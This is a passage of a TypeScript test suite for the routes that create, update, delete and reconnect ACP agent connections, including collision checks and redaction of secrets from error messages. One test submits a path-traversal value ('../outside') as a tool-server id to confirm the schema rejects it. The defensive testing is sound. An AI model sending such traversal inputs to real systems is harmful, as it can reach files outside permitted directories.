    expect(ctx.acpBridge.addConnection).not.toHaveBeenCalled();
    expect(await configLoader.agentExists('muse')).toBe(false);
  });

  test('POST /connections creates connection', async () => {
    const ctx = createMockRuntimeContext();
    const app = asOperator(createACPRoutes(ctx as any));
    const body = await json(
      await app.request('/connections', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: 'test', command: 'kiro-cli', name: 'Test' }),
      }),
    );
    expect(body.success).toBe(true);
    expect(body.data.id).toBe('test');
  });

  test('POST /connections retries identically after JSON normalization and registry commit failure', async () => {
    const { ctx, configLoader } = await createFilesystemRuntimeContext();
    const originalAgentExists = configLoader.agentExists.bind(configLoader);
    let failRegistryPreflight = true;
    configLoader.agentExists = async (slug: string) => {
      if (failRegistryPreflight) {
        failRegistryPreflight = false;
        throw new Error('simulated registry commit failure');
      }
      return originalAgentExists(slug);
    };
    const app = asOperator(createACPRoutes(ctx));
    const request = () =>
      app.request('/connections', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: 'kiro', command: 'kiro-cli' }),
      });

    const first = await request();
    const persistedAfterFailure = await configLoader.loadACPConfig();
    const listedAfterFailure = await json(await app.request('/connections'));
    const second = await request();

    expect(first.status).toBe(500);
    expect(second.status).toBe(200);
    expect(persistedAfterFailure.connections).toHaveLength(1);
    expect(listedAfterFailure.data).toEqual([]);
    expect(persistedAfterFailure.connections[0]).not.toHaveProperty('cwd');
    expect((await configLoader.loadACPConfig()).connections).toHaveLength(1);
    expect(
      (await loadOrCreateAgentRegistry(configLoader)).engineConnections,
    ).toContainEqual(
      expect.objectContaining({ id: 'kiro', source: { kind: 'user-acp' } }),
    );
  });

  test('POST /connections returns an activation-pending receipt after durable commit', async () => {
    const ctx = createMockRuntimeContext();
    ctx.applyAgentConfigurationMutation.mockImplementation(
      async (operation: any) => {
        const activation = { status: 'applied' as 'applied' | 'pending' };
        const result = await operation(
          ctx.beginAgentConfigurationMutation,
          activation,
        );
        activation.status = 'pending';
        Object.assign(activation, {
          reason:
            'Configuration was saved, but runtime activation is pending reconciliation.',
        });
        return result;
      },
    );
    const app = asOperator(createACPRoutes(ctx as any));

    const response = await app.request('/connections', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: 'test', command: 'kiro-cli' }),
    });

    expect(response.status).toBe(202);
    expect(await json(response)).toMatchObject({
      success: true,
      data: { id: 'test' },
      configurationActivation: { status: 'pending' },
    });
    expect(ctx.configLoader.saveACPConfig).toHaveBeenCalledOnce();
  });

  test('POST /connections returns 409 for duplicate', async () => {
    const ctx = createMockRuntimeContext();
    ctx.configLoader.loadACPConfig.mockResolvedValue({
      connections: [{ id: 'test', name: 'Test Engine', command: 'x' }],
    });
    const app = asOperator(createACPRoutes(ctx as any));
    const res = await app.request('/connections', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: 'test', command: 'kiro-cli' }),
    });
    expect(res.status).toBe(409);
    expect((await json(res)).error).toBe(
      'Test Engine already uses the ID "test". Choose a different ID under Advanced, or use Edit setup on Test Engine.',
    );
    expect(ctx.beginAgentConfigurationMutation).not.toHaveBeenCalled();
  });

  test('serializes duplicate detection with concurrent ACP creation', async () => {
    const ctx = createMockRuntimeContext();
    let stored = { connections: [] as any[] };
    ctx.configLoader.loadACPConfig.mockImplementation(async () =>
      structuredClone(stored),
    );
    ctx.configLoader.saveACPConfig.mockImplementation(async (next) => {
      stored = structuredClone(next);
    });
    let mutationQueue = Promise.resolve();
    ctx.applyAgentConfigurationMutation.mockImplementation(
      <T>(operation: (beginMutation: () => void) => Promise<T>): Promise<T> => {
        const result = mutationQueue.then(() =>
          operation(ctx.beginAgentConfigurationMutation),
        );
        mutationQueue = result.then(
          () => undefined,
          () => undefined,
        );
        return result;
      },
    );
    const app = asOperator(createACPRoutes(ctx as any));
    const request = () =>
      app.request('/connections', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: 'kiro', command: 'kiro-cli' }),
      });

    const responses = await Promise.all([request(), request()]);

    expect(responses.map((response) => response.status).sort()).toEqual([
      200, 200,
    ]);
    expect(stored.connections).toHaveLength(1);
    expect(ctx.acpBridge.addConnection).toHaveBeenCalledTimes(2);
    expect(ctx.beginAgentConfigurationMutation).toHaveBeenCalledTimes(2);
  });

  test('DELETE /connections/:id returns 404 without beginning a mutation when absent', async () => {
    const ctx = createMockRuntimeContext();
    const app = asOperator(createACPRoutes(ctx as any));

    const response = await app.request('/connections/missing', {
      method: 'DELETE',
    });

    expect(response.status).toBe(404);
    expect(ctx.beginAgentConfigurationMutation).not.toHaveBeenCalled();
    expect(ctx.configLoader.saveACPConfig).not.toHaveBeenCalled();
    expect(ctx.acpBridge.removeConnection).not.toHaveBeenCalled();
  });

  test('empty and same-value updates do not begin a mutation or restart the bridge', async () => {
    const ctx = createMockRuntimeContext();
    ctx.configLoader.loadACPConfig.mockResolvedValue({
      connections: [
        { id: 'kiro', name: 'Kiro', command: 'kiro-cli', enabled: true },
      ],
    });
    const app = asOperator(createACPRoutes(ctx as any));

    const empty = await app.request('/connections/kiro', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({}),
    });
    const same = await app.request('/connections/kiro', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'Kiro' }),
    });

    expect(empty.status).toBe(200);
    expect(same.status).toBe(200);
    expect(ctx.beginAgentConfigurationMutation).not.toHaveBeenCalled();
    expect(ctx.configLoader.saveACPConfig).not.toHaveBeenCalled();
    expect(ctx.acpBridge.removeConnection).not.toHaveBeenCalled();
    expect(ctx.acpBridge.addConnection).not.toHaveBeenCalled();
  });

  test('does not mutate the live ACP connection when durable update fails', async () => {
    const ctx = createMockRuntimeContext();
    const previous = {
      id: 'kiro',
      name: 'Kiro',
      command: 'kiro-cli',
      enabled: true,
    };
    ctx.configLoader.loadACPConfig.mockResolvedValue({
      connections: [previous],
    });
    ctx.configLoader.saveACPConfig.mockRejectedValue(new Error('write failed'));
    const app = asOperator(createACPRoutes(ctx as any));

    const response = await app.request('/connections/kiro', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command: 'kiro-cli-v2' }),
    });

    expect(response.status).toBe(500);
    expect(ctx.acpBridge.removeConnection).not.toHaveBeenCalled();
    expect(ctx.acpBridge.addConnection).not.toHaveBeenCalled();
  });

  test('deleting a connection removes its stored keys and forgets its sign-in', async () => {
    const home = makeTempDir('station-acp-delete-keys-');
    const keys = new EngineCredentials(home);
    registerEngineCredentials(keys);
    const signIn = new EngineSignInService({ terminal: null });
    const forget = vi.spyOn(signIn, 'forget');
    registerEngineSignIn(signIn);
    try {
      const command = '/usr/local/bin/droid';
      await keys.set('droid', 'FACTORY_API_KEY', 'fk-delete-me', [
        'FACTORY_API_KEY',
      ]);
      await keys.set('other', 'FACTORY_API_KEY', 'fk-keep-me', [
        'FACTORY_API_KEY',
      ]);
      const ctx = createMockRuntimeContext();
      let stored = {
        connections: [
          { id: 'droid', name: 'Droid', command, enabled: true },
          { id: 'other', name: 'Other', command, enabled: true },
        ],
      };
      ctx.configLoader.loadACPConfig.mockImplementation(async () =>
        structuredClone(stored),
      );
      ctx.configLoader.saveACPConfig.mockImplementation(async (next) => {
        stored = structuredClone(next) as typeof stored;
      });
      const app = asOperator(createACPRoutes(ctx as any));

      recordEngineAuthenticated(stored.connections[0]);
      const res = await app.request('/connections/droid', { method: 'DELETE' });

      expect(res.status).toBe(200);
      expect(forget).toHaveBeenCalledWith('droid');
      expect((await engineSignInStatus({ id: 'droid', command })).state).toBe(
        'unknown',
      );
      expect(keys.envFor('droid', ['FACTORY_API_KEY'])).toEqual({});
      expect(keys.envFor('other', ['FACTORY_API_KEY'])).toEqual({
        FACTORY_API_KEY: 'fk-keep-me',
      });
    } finally {
      registerEngineCredentials(null);
      registerEngineSignIn(null);
    }
  });

  test('changing the invocation retires sign-in evidence before rechecking the connection', async () => {
    const ctx = createMockRuntimeContext();
    const original = { id: 'pi', name: 'Pi', command: 'pi-acp', enabled: true };
    ctx.configLoader.loadACPConfig.mockResolvedValue({
      connections: [original],
    });
    recordEngineAuthenticated(original);
    const signIn = new EngineSignInService({ terminal: null });
    const forget = vi.spyOn(signIn, 'forget');
    registerEngineSignIn(signIn);
    try {
      const app = asOperator(createACPRoutes(ctx as any));
      const res = await app.request('/connections/pi', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: 'goose', args: ['acp'] }),
      });
      expect(res.status).toBe(200);
      expect(forget).toHaveBeenCalledExactlyOnceWith('pi');
      expect((await engineSignInStatus(original)).state).toBe('unknown');
    } finally {
      registerEngineSignIn(null);
      resetEngineAuthStatus();
    }
  });

  test('serializes ACP connection updates and deletion', async () => {
    const ctx = createMockRuntimeContext();
    let stored = {
      connections: [
        { id: 'kiro', name: 'Kiro', command: 'kiro-cli', enabled: true },
      ],
    };
    ctx.configLoader.loadACPConfig.mockImplementation(async () =>
      structuredClone(stored),
    );
    ctx.configLoader.saveACPConfig.mockImplementation(async (next) => {
      stored = structuredClone(next) as typeof stored;
    });
    const app = asOperator(createACPRoutes(ctx as any));

    const update = await app.request('/connections/kiro', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'Kiro Updated' }),
    });
    const remove = await app.request('/connections/kiro', {
      method: 'DELETE',
    });

    expect(update.status).toBe(200);
    expect(remove.status).toBe(200);
    expect(ctx.applyAgentConfigurationMutation).toHaveBeenCalledTimes(2);
    expect(ctx.acpBridge.removeConnection).toHaveBeenCalledTimes(2);
    expect(stored.connections).toEqual([]);
  });

  test('MCP passthrough (docs/design/connections-onboarding.md §5): PUT persists `provideToolServers`, off by default on create', async () => {
    const ctx = createMockRuntimeContext();
    let stored: {
      connections: Array<{
        id: string;
        name: string;
        command: string;
        enabled: boolean;
        provideToolServers?: string[];
      }>;
    } = {
      connections: [
        {
          id: 'opencode',
          name: 'OpenCode',
          command: 'opencode',
          enabled: true,
        },
      ],
    };
    ctx.configLoader.loadACPConfig.mockImplementation(async () =>
      structuredClone(stored),
    );
    ctx.configLoader.saveACPConfig.mockImplementation(async (next) => {
      stored = structuredClone(next) as typeof stored;
    });
    const app = asOperator(createACPRoutes(ctx as any));

    // Create: no provideToolServers supplied ⇒ absent, never inferred.
    expect(stored.connections[0].provideToolServers).toBeUndefined();

    const update = await app.request('/connections/opencode', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ provideToolServers: ['filesystem'] }),
    });
    expect(update.status).toBe(200);
    expect(await json(update)).toMatchObject({
      success: true,
      data: { provideToolServers: ['filesystem'] },
    });
    expect(stored.connections[0].provideToolServers).toEqual(['filesystem']);

    // Explicitly clearing the selection turns passthrough back off.
    const cleared = await app.request('/connections/opencode', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ provideToolServers: [] }),
    });
    expect(cleared.status).toBe(200);
    expect(stored.connections[0].provideToolServers).toEqual([]);
  });

  test('MED-1 (repo review, 2026-07-26): PUT /connections/:id rejects a path-traversal provideToolServers id at the schema layer', async () => {
    const ctx = createMockRuntimeContext();
    ctx.configLoader.loadACPConfig.mockResolvedValue({
      connections: [
        {
          id: 'opencode',
          name: 'OpenCode',
          command: 'opencode',
          enabled: true,
        },
      ],
    });
    const app = asOperator(createACPRoutes(ctx as any));

    const response = await app.request('/connections/opencode', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ provideToolServers: ['../outside'] }),
    });

    expect(response.status).toBe(400);
    expect(await json(response)).toMatchObject({ success: false });
    expect(ctx.configLoader.saveACPConfig).not.toHaveBeenCalled();
  });

  test('POST /connections/:id/reconnect returns success on a completed handshake', async () => {
    const ctx = createMockRuntimeContext();
    ctx.acpBridge.getStatus.mockReturnValue({
      connected: true,
      connections: [{ id: 'kiro', name: 'Kiro', status: 'unavailable' }],
    });
    const app = asOperator(createACPRoutes(ctx as any));

    const response = await app.request('/connections/kiro/reconnect', {
      method: 'POST',
    });

    expect(response.status).toBe(200);
    expect(await json(response)).toEqual({ success: true });
    expect(ctx.acpBridge.reconnect).toHaveBeenCalledExactlyOnceWith('kiro');
  });

  // station#2253: a failed reconnect used to answer HTTP 200 with
  // `{ success: false }` and no `error` field, so the published CLI could
  // only print "Request failed with HTTP 200". The failure must be a non-2xx
  // with a bounded, sanitized diagnostic.
  test('POST /connections/:id/reconnect returns 502 with a sanitized diagnostic on a failed handshake', async () => {
    const ctx = createMockRuntimeContext();
    ctx.acpBridge.getStatus.mockReturnValue({
      connected: false,
      connections: [
        {
          id: 'kiro',
          name: 'Kiro',
          status: 'unavailable',
          lastError: {
            message:
              'spawn kiro-cli ENOENT: handshake failed for --api-key=abc123 from /Users/me/private/project',
            phase: 'spawn',
          },
        },
      ],
    });
    ctx.acpBridge.reconnect.mockResolvedValue(false);
    const app = asOperator(createACPRoutes(ctx as any));

    const response = await app.request('/connections/kiro/reconnect', {
      method: 'POST',
    });

    expect(response.status).toBe(502);
    const body = await json(response);
    expect(body.success).toBe(false);
    expect(body.error).toBe('Could not check Kiro.');
    expect(body.phase).toBe('spawn');
    // Secret-redacted and path-stripped: the raw credential shape and the
    // absolute path from the probe failure never reach the client.
    expect(body.detail).toContain('[REDACTED]');
    expect(body.detail).not.toContain('abc123');
    expect(body.detail).not.toContain('/Users/me');
  });

  test('reconnect reports the new attempt error instead of the prior failure', async () => {
    const ctx = createMockRuntimeContext();
    ctx.acpBridge.getStatus
      .mockReturnValueOnce({
        connected: false,
        connections: [
          {
            id: 'opencode',
            lastError: { message: 'old failure', phase: 'spawn' },
          },
        ],
      })
      .mockReturnValue({
        connected: false,
        connections: [
          {
            id: 'opencode',
            lastError: {
              message: 'new initialize timeout',
              phase: 'initialize',
            },
          },
        ],
      });
    ctx.acpBridge.reconnect.mockResolvedValue(false);
    const response = await asOperator(createACPRoutes(ctx as any)).request(
      '/connections/opencode/reconnect',
      { method: 'POST' },
    );
    expect(response.status).toBe(502);
    const body = await json(response);
    expect(body.detail).toBe('new initialize timeout');
    expect(body.phase).toBe('initialize');
    expect(JSON.stringify(body)).not.toContain('old failure');
  });

  test('POST /connections/:id/reconnect returns a standalone error when the failure carries no diagnostic', async () => {
    const ctx = createMockRuntimeContext();
    ctx.acpBridge.getStatus.mockReturnValue({
      connected: false,
      connections: [{ id: 'kiro', name: 'Kiro', status: 'probing' }],
    });
    ctx.acpBridge.reconnect.mockResolvedValue(false);
    const app = asOperator(createACPRoutes(ctx as any));

    const response = await app.request('/connections/kiro/reconnect', {
      method: 'POST',
    });

    expect(response.status).toBe(502);
    expect(await json(response)).toEqual({
      success: false,
      error: 'Could not check Kiro.',
    });
  });

  test('POST /connections/:id/reconnect returns 404 for a connection the bridge does not hold', async () => {
    const ctx = createMockRuntimeContext();
    const app = asOperator(createACPRoutes(ctx as any));

    const response = await app.request('/connections/missing/reconnect', {
      method: 'POST',
    });

    expect(response.status).toBe(404);
    expect(await json(response)).toEqual({
      success: false,
      error: 'Connection not found',
    });
    expect(ctx.acpBridge.reconnect).not.toHaveBeenCalled();
  });

  test('POST /connections/:id/reconnect answers 502 with a sanitized detail when the probe throws', async () => {
    const ctx = createMockRuntimeContext();
    ctx.acpBridge.getStatus.mockReturnValue({
      connected: false,
      connections: [{ id: 'muse', name: 'Muse', status: 'unavailable' }],
    });
    ctx.acpBridge.reconnect.mockRejectedValue(
      new Error('spawn muse ENOENT: Bearer sk-test1234 leaked in stderr'),
    );
    const app = asOperator(createACPRoutes(ctx as any));

    const response = await app.request('/connections/muse/reconnect', {
      method: 'POST',
    });

    expect(response.status).toBe(502);
    const body = await json(response);
    expect(body.success).toBe(false);
    expect(body.error).toBe('Could not check Muse.');
    expect(body.detail).toContain('[REDACTED]');
    expect(body.detail).not.toContain('sk-test1234');
  });
  /**
   * #3355: an ACP connection that takes a native runtime Adapter's id resolves
   * to that engine's public connection, and attribution then labels the native
   * engine's Agents `acp`. The route refuses the id before any durable write.
   * The Adapter is the real `CodexAdapter`, registered the way bootstrap
   * registers it (a builtin `providerAdapter` entry).
   */
  describe('native engine id collisions (#3355)', () => {
    function registerNativeCodex() {
      providerEntries.push({
        source: 'providerAdapter:station-core',
        builtin: true,
        provider: new CodexAdapter(),
      });
    }

    test('POST /connections refuses an id a native runtime Adapter owns', async () => {
      registerNativeCodex();
      const ctx = createMockRuntimeContext();
      const app = asOperator(createACPRoutes(ctx as any));

      const response = await app.request('/connections', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: 'codex', command: 'codex-acp' }),
      });

      expect(response.status).toBe(400);
      const body = await json(response);
      expect(body.success).toBe(false);
      expect(body.error).toBe(
        "Connection id 'codex' is already used by the 'codex' engine. Choose a different id for the ACP connection.",
      );
      expect(ctx.configLoader.saveACPConfig).not.toHaveBeenCalled();
      expect(ctx.acpBridge.addConnection).not.toHaveBeenCalled();
    });

    test("POST /connections refuses a plugin Adapter's public connection id that differs from its engine id", async () => {
      providerEntries.push({
        source: 'providerAdapter:plugin-x',
        provider: {
          provider: 'xcli',
          metadata: {
            displayName: 'X',
            description: 'runtime',
            capabilities: ['agent-runtime'],
            engineId: 'xcli',
            connectionId: 'xcli-local',
          },
        },
      });
      const ctx = createMockRuntimeContext();
      const app = asOperator(createACPRoutes(ctx as any));

      const response = await app.request('/connections', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: 'xcli-local', command: 'x-acp' }),
      });

      expect(response.status).toBe(400);
      // Names the engine that owns the id, not the id itself.
      expect((await json(response)).error).toBe(
        "Connection id 'xcli-local' is already used by the 'xcli' engine. Choose a different id for the ACP connection.",
      );
      expect(ctx.configLoader.saveACPConfig).not.toHaveBeenCalled();
    });

    test('POST /connections still accepts an ACP id no native Adapter owns', async () => {
      registerNativeCodex();
      const ctx = createMockRuntimeContext();
      const app = asOperator(createACPRoutes(ctx as any));

      const response = await app.request('/connections', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: 'kiro', command: 'kiro-cli' }),
      });

      expect(response.status).toBe(200);
      expect(ctx.configLoader.saveACPConfig).toHaveBeenCalledOnce();
    });

    test('POST /registry/:id/install refuses a registry entry whose id a native Adapter owns', async () => {
      registerNativeCodex();
      providerEntries.push({
        source: 'acpConnectionRegistry:plugin-bridge',
        provider: {
          listAvailable: () => [
            { id: 'codex', name: 'Codex (ACP)', command: 'codex-acp' },
          ],
        },
      });
      const ctx = createMockRuntimeContext();
      const app = asOperator(createACPRoutes(ctx as any));

      const response = await app.request('/registry/codex/install', {
        method: 'POST',
      });

      expect(response.status).toBe(400);
      expect((await json(response)).error).toContain(
        "Connection id 'codex' is already used by the 'codex' engine",
      );
      expect(ctx.configLoader.saveACPConfig).not.toHaveBeenCalled();
      expect(ctx.acpBridge.addConnection).not.toHaveBeenCalled();
      expect(ctx.beginAgentConfigurationMutation).not.toHaveBeenCalled();
    });
  });
});
